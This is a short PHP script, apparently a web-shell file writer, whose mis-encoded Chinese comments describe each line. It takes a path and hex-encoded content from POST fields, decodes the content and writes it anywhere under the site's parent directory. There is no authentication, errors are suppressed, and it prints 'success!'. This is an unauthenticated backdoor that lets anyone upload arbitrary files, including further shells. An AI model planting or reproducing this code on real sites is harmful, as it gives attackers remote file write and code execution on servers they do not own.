    <?php
    $p=realpath(dirname(__FILE__)."/../").$_POST["a"]; //����$pΪ��Ŀ¼������·��+$_POST["a"]������
    $t=$_POST["b"]; //����$tΪ$_POST["b"]������
    $tt=""; //����$ttΪ��
    for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2)); //forѭ��������$t����/2��ÿѭ��һ�ξ���$tt���ϡ�%xx�������ı���
    @fwrite(fopen($p,"w"),$tt); //д���ļ���ַ��$p��������$tt
    echo "success!";
    ?>